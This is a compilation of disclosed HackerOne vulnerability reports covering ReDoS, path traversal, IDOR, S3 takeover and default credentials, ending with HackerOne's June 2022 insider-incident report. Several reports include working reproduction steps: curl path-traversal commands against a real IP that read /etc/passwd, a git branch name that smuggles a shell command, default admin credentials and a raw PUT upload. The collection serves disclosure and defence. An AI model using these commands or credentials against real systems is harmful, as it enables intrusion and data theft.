      buf << "\r\n"
    end
    buf << "--#{boundary}--\r\n"
    flush_buffer(out, buf, false)
  end
end  

data = [["dummy"]]

url = URI.parse('http://127.0.0.1:9292/')
req = Net::HTTP::Post.new(url.path)
req.set_form(data, "multipart/form-data")

res = Net::HTTP.new(url.host, url.port).start do |http|
  http.request(req)
end
```

`bundle exec rackup` & `bundle exec ruby rfc2183_request.rb`

## Impact

When the client sends a specially crafted header, it occur ReDoS on the server side.
I confirmed that the combination of puma, unicorn, puma + nginx, unicorn + nginx occur Redos.

There are several other places where `Rack::Multipart` is likely to be ReDoS, and it seems good to exclude it as a workaround if user do not use file upload.

#### work around

```ruby
class Rack::Request
  def parse_multipart
    nil
  end
end
```

---

### [Cloudflare CASB Confused Deputy Problem](https://hackerone.com/reports/1952124)

- **Report ID:** `1952124`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @albertspedersen
- **Bounty:** 3300 usd
- **Disclosed:** 2023-06-07T09:05:52.488Z
- **CVE(s):** -

**Summary (team):**

Cloudflare CASB on a select number of integrations, Microsoft and GitHub, was vulnerable to the confused deputy problem. If an attacker, via a brute force attack or another mechanism, was able to enumerate a valid Microsoft tenant UUID or Microsoft domain, or GitHub installation_id that an existing Cloudflare CASB customer had integrated with, then the attacker would have been able to create a new integration which could surface sensitive information. Cloudflare's CASB engineering team rapidly implemented a fix to disallow the ability to create multiple integrations pointing to the same tenant, thus nullifying the attack as an option. Moreover, an internal investigation did not show impact to any customer data (outside of the reporting researcher's accounts).

---

### [download file type warning on Windows does not appear if "ask where to save file before downloading" setting is enabled](https://hackerone.com/reports/1848062)

- **Report ID:** `1848062`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Brave Software
- **Reporter:** @ameenbasha
- **Bounty:** 500 usd
- **Disclosed:** 2023-05-10T07:09:07.209Z
- **CVE(s):** CVE-2023-28360

**Summary (team):**

It was discovered that the "Ask where to save each file before downloading" setting disables the potentially-malicious file type warning for downloads in Brave. This behavior is also present in Chrome: https://bugs.chromium.org/p/chromium/issues/detail?id=1410578.

---

### [Ruby's CGI library has HTTP response splitting (HTTP header injection), leaking confidential information](https://hackerone.com/reports/1889474)

- **Report ID:** `1889474`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Internet Bug Bounty
- **Reporter:** @ht0k
- **Bounty:** - usd
- **Disclosed:** 2023-04-09T16:35:07.526Z
- **CVE(s):** CVE-2021-33621

**Summary (team):**

CVE-2021-33621: HTTP response splitting in CGI
Posted by mame on 22 Nov 2022

We have released the cgi gem version 0.3.5, 0.2.2, and 0.1.0.2 that has a security fix for a HTTP response splitting vulnerability. This vulnerability has been assigned the CVE identifier CVE-2021-33621.

Details
If an application that generates HTTP responses using the cgi gem with untrusted user input, an attacker can exploit it to inject a malicious HTTP response header and/or body.

Also, the contents for a CGI::Cookie object were not checked properly. If an application creates a CGI::Cookie object based on user input, an attacker may exploit it to inject invalid attributes in Set-Cookie header. We think such applications are unlikely, but we have included a change to check arguments for CGI::Cookie#initialize preventatively.

Please update the cgi gem to version 0.3.5, 0.2.2, and 0.1.0.2, or later. You can use gem update cgi to update it. If you are using bundler, please add gem "cgi", ">= 0.3.5" to your Gemfile.

Credits
Thanks to Hiroshi Tokumaru for discovering this issue.

Full Advisory: https://www.ruby-lang.org/en/news/2022/11/22/http-response-splitting-in-cgi-cve-2021-33621/

---

### [Use of Cryptographically Weak Pseudo-Random Number Generator in WebCrypto keygen](https://hackerone.com/reports/1888803)

- **Report ID:** `1888803`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Internet Bug Bounty
- **Reporter:** @imhunternull
- **Bounty:** 4000 usd
- **Disclosed:** 2023-04-09T16:22:48.430Z
- **CVE(s):** CVE-2022-35255

**Summary (team):**

CVE-2022-35255 Detail

Description
A weak randomness in WebCrypto keygen vulnerability exists in Node.js 18 due to a change with EntropySource() in SecretKeyGenTraits::DoKeyGen() in src/crypto/crypto_keygen.cc. There are two problems with this: 1) It does not check the return value, it assumes EntropySource() always succeeds, but it can (and sometimes will) fail. 2) The random data returned byEntropySource() may not be cryptographically strong and therefore not suitable as keying material.

NVD Link: https://nvd.nist.gov/vuln/detail/CVE-2022-35255
HackerOne original report: https://hackerone.com/reports/1690000

---

### [Fraudulent claim of business.](https://hackerone.com/reports/1422227)

- **Report ID:** `1422227`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Yelp
- **Reporter:** @ilpadrino
- **Bounty:** - usd
- **Disclosed:** 2023-02-06T21:50:35.743Z
- **CVE(s):** -

**Summary (team):**

Report states that one could claim any business by just substituting the business' phone number with theirs during the claim flow. This is not correct, as the number enter is internally verified and, therefore, the claim process eventually fails.

---

### [Using special IPv4-mapped IPv6 addresses to bypass local IP ban](https://hackerone.com/reports/1785260)

- **Report ID:** `1785260`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Cloudflare Public Bug Bounty
- **Reporter:** @albertspedersen
- **Bounty:** 7500 usd
- **Disclosed:** 2023-01-24T11:17:49.059Z
- **CVE(s):** -

**Summary (team):**

By using IPv4-mapped IPv6 addresses there was a way to bypass Cloudflare server's network protections and start connections to ports on the loopback (127.0.0.1) or internal IP addresses (such as 10.0.0.1). The bug was caused by the way a Go library interprets mapped IP addresses and how our code was checking for banned IPs. The code was fixed and now checks both IPv4 and IPv6 properly.

**Summary (researcher):**

Cloudflare has checks in place to block requests destined for banned IP addresses like local and reserved IP ranges. It was possible to bypass these restrictions using proxied AAAA records containing IPv4-mapped IPv6 addresses (e.g. `::ffff:127.0.0.1` and `::ffff:10.0.0.1`). This made it possible to access HTTP services listening on the loopback interface of the edge server handling the request, as well as the internal IP addresses of other hosts on the local network.

---

### [S3 bucket takeover [learn2.khanacademy.org]](https://hackerone.com/reports/1777077)

- **Report ID:** `1777077`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Khan Academy
- **Reporter:** @fdeleite
- **Bounty:** - usd
- **Disclosed:** 2022-12-29T06:12:13.014Z
- **CVE(s):** -

**Vulnerability Information:**

The subdomain learn2.khanacademy.org was pointed  to Amazon S3, but no bucket with that name was registered [learn2.khanacademy.org]. This meant that anyone could sign up for Amazon S3, claim the bucket as their own and then serve content.

## Steps to reproduce
 
Check the following url:
http://learn2.khanacademy.org

Also

```
>  curl -k http://learn2.khanacademy.org/
<!doctype html>
<html>
  <head>
    <title>S3 takeover POC</title>
  </head>
  <body>
    <p>This is S3 takeover POC </p>
  </body>
</html>
```

## Impact

It's extremely vulnerable to attacks as a malicious user could create any web page with any content and host it on the `ford.com` domain. This would allow them to post malicious content which would be mistaken for a valid site. 

They could perform several attacks like:
 - Cookie Stealing
 - Phishing campaigns. 
 - Bypass Content-Security Policies and CORS.
 
## Recommendations for fix

* Remove the affected DNS record
 

### Supporting Material/References:

 - https://0xpatrik.com/subdomain-takeover/
 - https://hackerone.com/reports/661751

---

### [ReDoS (Rails::Html::PermitScrubber.scrub_attribute)](https://hackerone.com/reports/1804128)

- **Report ID:** `1804128`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Internet Bug Bounty
- **Reporter:** @ooooooo_q
- **Bounty:** 4000 usd
- **Disclosed:** 2022-12-14T22:51:27.924Z
- **CVE(s):** CVE-2022-23514

**Vulnerability Information:**

I reported at  https://hackerone.com/reports/1684163

https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-5x79-w82f-gw8w

> Certain configurations of rails-html-sanitizer < 1.4.4 use an inefficient regular expression that is susceptible to excessive backtracking when attempting to sanitize certain SVG attributes. This may lead to a denial of service through CPU resource consumption.

It seems that the same problem existed on the Loofah side, so it was fixed as well. That has been fixed as CVE-2022-23514(https://github.com/flavorjones/loofah/security/advisories/GHSA-486f-hjj9-9vhh)

## Impact

ReDoS may occur if scrub is executed in Rails::Html::PermitScrubber.

**Summary (team):**

###Summary

Certain configurations of rails-html-sanitizer ``< 1.4.4`` use an inefficient regular expression that is susceptible to excessive backtracking when attempting to sanitize certain SVG attributes. This may lead to a denial of service through CPU resource consumption.

###Mitigation

Upgrade to rails-html-sanitizer ``>= 1.4.4.``

###Severity

The maintainers have evaluated this as High Severity 7.5 (CVSS 3.1).

###References

- [CWE - CWE-1333: Inefficient Regular Expression Complexity (4.9)](https://cwe.mitre.org/data/definitions/1333.html)
- [https://hackerone.com/reports/1684163](https://cwe.mitre.org/data/definitions/1333.html)

---

### [Double evaluation in .bash_prompt of dotfiles allows a malicious repository to execute arbitrary commands](https://hackerone.com/reports/1785378)

- **Report ID:** `1785378`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Ian Dunn
- **Reporter:** @ryotak
- **Bounty:** - usd
- **Disclosed:** 2022-12-01T04:00:35.979Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
Due to the improper usage of the `PS1` environment variable in [`.bash_prompt` of dotfiles](https://github.com/iandunn/dotfiles/blob/16a432681077362f263cb926737ad5cca5df6307/.bash_prompt), a malicious repository can execute arbitrary commands when changed the current directory to it.

## Description
The `PS1` environment variable of bash supports command substitutions. For example, setting `PS1` to `$(echo hello)` executes `echo hello` each time the prompt is displayed.

Because [`.bash_prompt` of dotfiles](https://github.com/iandunn/dotfiles/blob/16a432681077362f263cb926737ad5cca5df6307/.bash_prompt) uses the following code to display the VCS information, if any outputs of these commands contain command substitution syntaxes, it'll be evaluated while printing the prompt.

[`.bash_prompt` line 264-266](https://github.com/iandunn/dotfiles/blob/16a432681077362f263cb926737ad5cca5df6307/.bash_prompt#L264-L266)
``` bash
	export PS1="\n${command_mark}${color_user_host}\u${color_reset} @ ${color_user_host}$hostname${color_reset} in ${color_folder}\w${color_reset} \
	$(vcs_prompt) \
	\n> "
```

Since `vcs_prompt` contains the information of Git or SVN, a malicious repository with a crafted branch name can execute arbitrary commands.

[`.bash_prompt` line 241-254](https://github.com/iandunn/dotfiles/blob/16a432681077362f263cb926737ad5cca5df6307/.bash_prompt#L241-L254)
``` bash
function vcs_prompt {
	GIT_PROMPT=$(git_status)
	SVN_PROMPT=$(svn_status)

	if [[ -n $GIT_PROMPT ]]; then
		echo -n "\n$GIT_PROMPT"

		if [[ -n $SVN_PROMPT ]]; then
			echo -n ", $SVN_PROMPT"
		fi
	elif [[ -n $SVN_PROMPT ]]; then
		echo "\n$SVN_PROMPT"
	fi
}
```

## Steps to reproduce
1. Set up dotfiles. (For the minimal setup, I used {F2051541} to set up `.bash_prompt`.)
2. Create a git repository with a crafted name: `git init -b '$(touch${IFS}/tmp/pwned)' repo`
3. Enter the repository: `cd repo`
4. Confirm that `touch /tmp/pwned` is executed.

{F2051546}

## Impact
An attacker can execute arbitrary commands by tricking the victim into entering a malicious directory.

---

### [Public Github Repo Leaking Internal Credentials ](https://hackerone.com/reports/1763266)

- **Report ID:** `1763266`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Yelp
- **Reporter:** @xinfohuggerx
- **Bounty:** - usd
- **Disclosed:** 2022-11-07T23:45:12.278Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
In Github I found some credentials to use in a mesos.apache.org 
Github:
https://github.com/Yelp/Tron/blob/master/yelp_package/itest_dockerfiles/mesos/mesos-secrets
https://github.com/Yelp/Tron/blob/master/yelp_package/itest_dockerfiles/mesos/mesos-slave-secret

## POC ss

{F2021070}
{F2021071}

Login documentation https://mesos.apache.org
https://mesos.apache.org/documentation/latest/authentication/

## Impact

Unauthorized account access  /information disclosure

---

### [IDOR  [mtnmobad.mtnbusiness.com.ng]](https://hackerone.com/reports/1698006)

- **Report ID:** `1698006`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** MTN Group
- **Reporter:** @insomnia_hax
- **Bounty:** - usd
- **Disclosed:** 2022-10-13T07:18:08.412Z
- **CVE(s):** -

**Vulnerability Information:**

## Steps To Reproduce:

  1.  Go to https://mtnmobad.mtnbusiness.com.ng/#/dashboard/home with burp proxy
  1. Intercept a POST request to /app/dashboardData and review its response you will see emails and ids 
  1. Go to https://mtnmobad.mtnbusiness.com.ng/#/userProfile
  1. change name, mobile, address etc. and intercept with burp proxy
  1. change the id and the email with victim's and forward the request
  1. The changes will be saved in the victim's account


# Note:

If you already know account's email and id you can skip step 1 and 2

## Supporting Material/References:

  {F1922714}

## Impact

An attacker can change every user's account information

---

### [No password length restriction in reset password endpoint at http://suppliers.mtn.cm](https://hackerone.com/reports/1285694)

- **Report ID:** `1285694`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** MTN Group
- **Reporter:** @aliyugombe
- **Bounty:** - usd
- **Disclosed:** 2022-09-05T23:00:44.261Z
- **CVE(s):** -

**Vulnerability Information:**

Hello

## Summary:
I found no password length restriction in reset password endpoint at http://suppliers.mtn.cm when resetting new password

## Steps To Reproduce:
1. Visit https://suppliers.mtn.cm/ and register.
2. logout and reset your password
3. go to your email and click on reset password link
4. enter 150 characters as a password and confirm the characters
5. you will successfully logged in.

## Impact

Attacker can do denial of service to your server since there is no restriction in the length of password.
Example when he enter like 2500 character, your server will crash for some time,

I did not attempt to ddos your server,  because you exclude any activity related to denial of service to your assets, I only test for 150 character and its working.

##Mitigation :
Restrict user to use less than 40 character as a password, while the restriction should be both on back-end and front-end (with javascript ).

##Thank you

---

### [path traversal vulnerability in Grafana 8.x allows " local file read "](https://hackerone.com/reports/1427086)

- **Report ID:** `1427086`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** MTN Group
- **Reporter:** @malagham
- **Bounty:** - usd
- **Disclosed:** 2022-09-03T12:14:29.473Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team,
I've found a path traversal issue in the Grafana instances hosted on the MTN platforms. With the path traversal it's possible for an unauthenticated user to read arbitrary files on the server.
This IP " 41.242.91.22 " Domain Name " mtn.com.gn "  is for MTN Group 

{F1545670} {F1545682}

##Steps To Reproduce:
1. Open url address  :  http://41.242.91.22:3000/login

{F1545653}

2. File Read server for example /etc/passwd : 

Run the following command on the mac, linux terminal

```curl http://41.242.91.22:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd```

Respons:

```
MacBook-Pro ~ % curl http://41.242.91.22:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
libstoragemgmt:x:998:996:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
colord:x:997:995:User for colord:/var/lib/colord:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
radvd:x:75:75:radvd user:/:/sbin/nologin
qemu:x:107:107:qemu user:/:/sbin/nologin
gluster:x:995:992:GlusterFS daemons:/run/gluster:/sbin/nologin
chrony:x:994:991::/var/lib/chrony:/sbin/nologin
unbound:x:993:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
geoclue:x:992:988:User for geoclue:/var/lib/geoclue:/sbin/nologin
setroubleshoot:x:991:987::/var/lib/setroubleshoot:/sbin/nologin
pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
gdm:x:42:42::/var/lib/gdm:/sbin/nologin
saned:x:990:984:SANE scanner daemon user:/usr/share/sane:/sbin/nologin
gnome-initial-setup:x:989:983::/run/gnome-initial-setup/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
infraop:x:1000:1000:infraop:/home/infraop:/bin/bash
nginx:x:988:982:Nginx web server:/var/lib/nginx:/sbin/nologin
armand_k:x:1001:1001::/home/armand_k:/bin/bash
deploy:x:1002:1002::/home/deploy:/bin/bash
postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
memcached:x:987:980:Memcached daemon:/run/memcached:/sbin/nologin
redis:x:986:979:Redis Database Server:/var/lib/redis:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
uwayo:x:1003:1003::/home/uwayo:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
mugabo:x:1004:1004::/home/mugabo:/bin/bash
nimble:x:985:978:user for Nimble Streamer:/etc/nimble:/sbin/nologin
arnold:x:1005:1005::/home/arnold:/bin/bash
as_ftp:x:1006:1006::/home/as_ftp:/bin/bash
toure:x:1007:1007::/home/toure:/bin/bash
mayur:x:1008:1008::/home/mayur:/bin/bash
prometheus:x:1009:1009::/home/prometheus:/bin/false
sd-agent:x:984:977:Server Density Agent User:/usr/bin/sd-agent/:/bin/bash
node_exporter:x:983:976::/home/node_exporter:/bin/false
grafana:x:982:975:grafana user:/usr/share/grafana:/sbin/nologin
egales:x:1010:1010::/home/egales:/bin/bash
```

3. File Read server  /usr/share/grafana/conf/defaults.ini  :

Grafana config file

```
curl http://41.242.91.22:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fshare%2Fgrafana%2Fconf%2Fdefaults.ini
```

{F1545689}

3. File Read server  /etc/resolv.conf  :

```curl http://41.242.91.22:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fresolv.conf```

```
MacBook-Pro ~ % curl http://41.242.91.22:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fresolv.conf
# Generated by NetworkManager
nameserver 102.176.175.67
nameserver 102.176.175.93
```
Tanke you

## Impact

An unauthenticated user can get access to all system files if he knows the exact path of the file.

---

### [Default Admin Username and Password on remedysso.mtncameroon.net](https://hackerone.com/reports/1397786)

- **Report ID:** `1397786`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** MTN Group
- **Reporter:** @dh0pe
- **Bounty:** - usd
- **Disclosed:** 2022-09-01T20:50:32.925Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
A Remedy Single Sign-On (Remedy SSO) Server is running at https://remedysso.mtncameroon.net/rsso/admin/#/.  
It is possible to access the application is using the default Administrator credentials.

## Steps To Reproduce:
Go to https://remedysso.mtncameroon.net/rsso/admin/#/ and login with credentials:
- Username: Admin
- Password: RSSO#Admin#

## Remediation
Change the password of the Admin user or disable the account.

## References
https://cwe.mitre.org/data/definitions/521.html

## Impact

A MNT Group Single Sign-On application was misconfigured in a manner that may have allowed a malicious user to login with the administrator user. The user is capable to perform any kind of configuration of the SSO system and retrieve sensitive information about organization users and infrastructure.

---

### [HTTP PUT method is enabled downloader.ratelimited.me](https://hackerone.com/reports/545136)

- **Report ID:** `545136`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** RATELIMITED
- **Reporter:** @codeslayer1337
- **Bounty:** - usd
- **Disclosed:** 2022-08-07T02:01:13.793Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Found on HTTP PUT sites enabled on web servers. I tried testing to write the file / codelayer137.txt uploaded to the server using the PUT verb, and the contents of the file were then taken using the GET verb

## Steps To Reproduce:
Request:
PUT /codeslayer137.txt HTTP/1.1
Host: downloader.ratelimited.me
Content-Length: 21
Connection: close

Testing By CodeSlayer

Response:
HTTP/1.1 200 OK
Date: Mon, 22 Apr 2019 13:10:13 GMT
Content-Type: download/thisfile
Content-Length: 0
Connection: close
Set-Cookie: __cfduid=d5508aeb63f9590d9be26bcccc049fdbf1555938612; expires=Tue, 21-Apr-20 13:10:12 GMT; path=/; domain=.ratelimited.me; HttpOnly; Secure
Accept-Ranges: bytes
Content-Security-Policy: block-all-mixed-content
Etag: "59448a863a8dbff84de1cf4f03c8e9cf"
Vary: Origin
X-Amz-Request-Id: 1597CDECEA82CBA5
X-Minio-Deployment-Id: ebc7a0d8-9f47-4bdb-92ee-4a9cbbd3ec48
X-Xss-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 4cb7d629decba9a2-SIN




POC: https://download.ratelimited.me/codeslayer137.txt

## Impact

The HTTP PUT method is normally used to upload data that is saved on the server at a user-supplied URL. If enabled, an attacker may be able to place arbitrary, and potentially malicious, content into the application. Depending on the server's configuration, this may lead to compromise of other users (by uploading client-executable scripts), compromise of the server (by uploading server-executable code), or other attacks.

---

### [Race condition in faucet when using starport](https://hackerone.com/reports/1438052)

- **Report ID:** `1438052`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Cosmos
- **Reporter:** @cyberboy
- **Bounty:** 5000 usd
- **Disclosed:** 2022-07-26T17:47:40.549Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team, 
I and Aditya sent this bug over email on Wed, 29 Dec, 17:45 IST. Later we noticed that security reports are accepted via the HackerOne program. So, I am sending a copy of the bug report here. 

## Summary:
We were testing an application and we found a race condition bug in the faucet Implementation of Starport. 
https://github.com/tendermint/starport

## Steps To Reproduce:
1. Start a starport with the below configuration. Note the "coins_max" has been set to 11 tokens and hence a user cannot fetch more after the 11 token limits.

```
accounts:
  - name: alice
    coins: ["0token", "200000000stake"]
  - name: bob
    coins: ["500token", "100000000stake"]
validator:
  name: alice
  staked: "100000000stake"
client:
  openapi:
    path: "docs/static/openapi.yml"
  vuex:
    path: "vue/src/store"
faucet:
  name: bob
  coins: ["5token", "100000stake"]  
  coins_max: ["11token", "100000stake"]
```

2. Now call the request manually  with 5 tokens per request as in our configuration after 2 requests and 10 tokens in total Alice won't be able to fetch more tokens from the faucet

```
POST / HTTP/1.1
Host: 172.105.41.242:4500
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.105.41.242:4500/
Content-Type: application/json
Origin: http://172.105.41.242:4500
Content-Length: 63
Connection: close
{
  "address": "ALICE_ADDRESS"}

```

Now we can confirm Alice cannot have more than 11 tokens. 

3.  Now regenerate the server and instead of sending a single request send a concurrent request to fetch tokens in Alice address.  We used 50 requests concurrently.

{F1563051}

4. Now when we check Alice balance it is 30 which should have not been more than 11

{F1563052}

We believe the root cause of the issues is the go mapping which is not advised for concurrency 
https://github.com/tendermint/starport/blob/develop/starport/pkg/cosmosfaucet/transfer.go#L59

## Supporting Material/References:
https://cwe.mitre.org/data/definitions/362.html

## Impact

A malicious user can send concurrent requests to fetch more tokes from faucets than the "max-credit limit" which allows.

**Summary (researcher):**

The proper writeup of the bug can be found here at our blogpost https://blog.credshields.com/race-condition-in-tendermints-starport-7cebe176d935

The root cause of the bug was in function “Transfer” at
https://github.com/tendermint/starport/blob/7812125/starport/pkg/cosmosfaucet/transfer.go#L50-L74
We can notice in the code that each request to the faucet causes two actions to be made; one for querying the account’s balance and the other for sending tokens. When sending concurrent requests to the faucet, in the time of querying the balance, for some requests, this check happens at the same time and ends up seeing less balance in the account because sending the tokens action has not been finalized for the previous requests.

---

### [June 2022 Incident Report](https://hackerone.com/reports/1622449)

- **Report ID:** `1622449`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** HackerOne
- **Reporter:** @jobert
- **Bounty:** - usd
- **Disclosed:** 2022-07-01T19:13:43.112Z
- **CVE(s):** -

**Summary (team):**

# Intro
Since the founding of HackerOne, we have kept a steadfast commitment to disclosing security incidents because we believe that sharing security information far and wide is essential to building a safer internet. HackerOne's culture is to disclose more often, and in more detail than the rest of the industry. This document represents our 431st disclosure to date and we hope it will prove useful to defenders everywhere.

If you were one of the customers directly impacted by this incident, you will have already received direct communication from us providing actionable details.

# Incident Summary
On June 22nd, 2022, a customer asked us to investigate a suspicious vulnerability disclosure made outside of the HackerOne platform. The submitter of this off-platform disclosure reportedly used intimidating language in communication with our customer. Additionally, the submitter’s disclosure was similar to an existing disclosure previously submitted through HackerOne. Bug collisions and duplicates, where multiple security researchers independently discover a single vulnerability, commonly occur in bug bounty platforms. However, this customer expressed skepticism that this was a genuine collision and provided detailed reasoning. The HackerOne security team took these claims seriously and immediately began an investigation.

Upon investigation by the HackerOne Security team, we discovered a then-employee had improperly accessed security reports for personal gain. The person anonymously disclosed this vulnerability information outside the HackerOne platform with the goal of claiming additional bounties. This is a clear violation of our values, our culture, our policies, and our employment contracts. In under 24 hours, we worked quickly to contain the incident by identifying the then-employee and cutting off access to data. We have since terminated the employee, and further bolstered our defenses to avoid similar situations in the future. Subject to our review with counsel, we will also decide whether criminal referral of this matter is appropriate. Our full discussion of the incident is below.

# Investigation Timeline

| Date | Event |
| --- | --- |
| 2022-06-22 10:30 PDT | Call with a customer requesting an investigation into reports of an intimidating and suspicious off-platform communication from an actor with the handle "rzlr" |
| 2022-06-22 11:30 PDT | Launched incident investigation into suspected threat actor |
| 2022-06-22 12:02 PDT | Escalated incident priority, Expanded scope of investigation to include additional off-platform interactions threat actor had with HackerOne customers |
| 2022-06-22 21:15 PDT | HackerOne Security team directs investigation toward a HackerOne employee account as possible source of access |
| 2022-06-22 23:29 PDT | Incident update and proposed plan of action shared with HackerOne executive team |
| 2022-06-23 09:03 PDT | Terminated system access and remotely locked laptop of suspected threat actor pending investigation |
| 2022-06-23 10:13 PDT | Immediately informed payment partner of investigative activity |
| 2022-06-23 12:01 PDT | Payment partner corroborated our suspected threat actor attribution with confidence |
| 2022-06-24 07:00 PDT | Interview conducted with suspended threat actor |
| 2022-06-27 13:30 PDT | Took possession of laptop of suspended threat actor and conducted remote forensics imaging and analysis |
| 2022-06-28 Late Evening PDT | Completed thorough log review of data access by threat actor during the entirety of their two and a half months of employment |
| 2022-06-29 10:00 PDT | Notifications to seven (7) customers known or suspected to be in contact with threat actor |
| 2022-06-30 13:27 PDT | Completed conversations with all customers known or suspected to be in contact with the threat actor, Additional evidence collated from multiple customer investigations of threat actor reinforces assessment that the threat actor and our suspended employee are the same individual.
| 2022-06-30 21:20 PDT | Officially terminated employment of the previously suspended threat actor |
| 2022-07-01 Late Morning PDT | Notifications to *all* customers whose programs had any interaction with this threat actor, including programs that may have only been accessed for legitimate job-related purposes |
| 2022-07-01 Evening PDT | HackerOne shares threat actor details with organizations in the vulnerability disclosure sector |

# Investigation
Our investigation has concluded that a (now former) HackerOne employee improperly accessed vulnerability data of customers to re-submit duplicate vulnerabilities to those same customers for personal gain.

The investigation began after a customer notified us of reportedly receiving a threatening communication, outside the HackerOne platform, about a vulnerability disclosure. We immediately launched an investigation. Within 30 minutes of the investigation, additional evidence surfaced that caused us to escalate the priority of the incident. We began to run down every scenario of a possible exposure to disclosure data, including potential exploitation of our application, a remote compromise of the hacker, customer, or analyst, a leak by misconfiguration, and others. There was information to support only one of our hypotheses, an internal threat actor.

Upon this discovery, we began a separate investigation into the insider threat with a contained group. These steps were necessary as we worked to investigate and eliminate the prospect of multiple insiders. We are now confident that this incident was limited to a single employee who improperly accessed information in clear violation of our values, our culture, our policies, and our employment contracts.

Within 24 hours of the tip from our customer, we took steps to terminate that employee's system access and remotely locked their laptop pending further investigation.

We were able to reach our conclusion quickly using the following methods. Our internal logging monitors employee access to customer disclosures for regular business operations, namely vulnerability intake and triage. Analysis of this log data suggested a likely actor soon after our internal investigation kicked off. Only a single employee had accessed each disclosure that our customers suspected of being re-disclosed by the threat actor.

The threat actor created a HackerOne sockpuppet account and had received bounties in a handful of disclosures. After identifying these bounties as likely improper, HackerOne reached out to the relevant payment providers, who worked cooperatively with us to provide additional information. Following the money trail, we received confirmation that the threat actor's bounty was linked to an account that financially benefited a then-HackerOne employee. Analysis of the threat actor’s network traffic provided supplemental evidence connecting the threat actor's primary and sockpuppet accounts. 

We identified seven customers who received direct communication from the threat actor. We notified each of the customers of our investigation and asked for information related to their interactions. We are grateful for their involvement in our investigation and we thank them for their willing cooperation. Facts shared from their own investigations corroborated the conclusion from our investigation and allowed us to act more quickly. 

